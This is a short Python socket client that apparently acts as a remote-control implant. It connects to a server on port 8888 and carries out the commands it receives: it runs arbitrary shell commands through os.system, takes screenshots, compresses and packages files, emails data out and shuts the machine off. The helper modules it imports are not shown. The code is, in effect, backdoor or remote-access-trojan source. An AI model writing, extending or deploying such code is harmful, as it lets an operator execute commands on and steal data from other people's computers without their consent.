
import socket
import os
import sys
import threading
import time
from compress import compress_get
from cut_screen import can_do
from EMAIL import fsend
from off import foff
from package import package_get

class client():
    def __init__(self):
        self.s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        self.ip = "127.0.0.1"
    def connect(self):
        try:
            self.s.connect((self.ip,8888))
            print("connect success")
            print('connect time: '+time.ctime())
        except ConnectionError:
            print('connect error')
            sys.exit(-1)
        except:
            print('unexpect error')
            sys.exit(-1)
    def send_sth(self):
        while True:
            sth=input('say something:\n')
            try:
                self.s.sendall(sth.encode('utf-8'))
            except ConnectionError:
                print('connect error')
                sys.exit(-1)
            except:
                print('unexpect error')
                sys.exit(-1)
    def receive(self):
        while True:
            try:
                r=self.s.recv(1024)
                print ('get message:'+r.decode('utf-8'))
                #print(type(r.decode('utf-8')))
                if r.decode('utf-8')=="cut":
                    can_do()
                if "com" in r.decode('utf-8'):
                    compress_get(r.decode('utf-8').strip("com"))
                if r.decode('utf-8')=="off":
                    foff() 
                if r.decode('utf-8')=="pag":
                    package_get()
                if "email" in r.decode('utf-8'):
                    fsend(r.decode('utf-8').strip("email"))
                if "cmd" in r.decode('utf-8'): #wmic
                    os.system(r.decode('utf-8').strip("cmd"))
            except ConnectionError:
                print('connect error')
                sys.exit(-1)
            except:
                print('unexpect error')
                sys.exit(-1)

c1 = client()
c1.connect()
threading._start_new_thread(c1.receive,())
c1.send_sth()
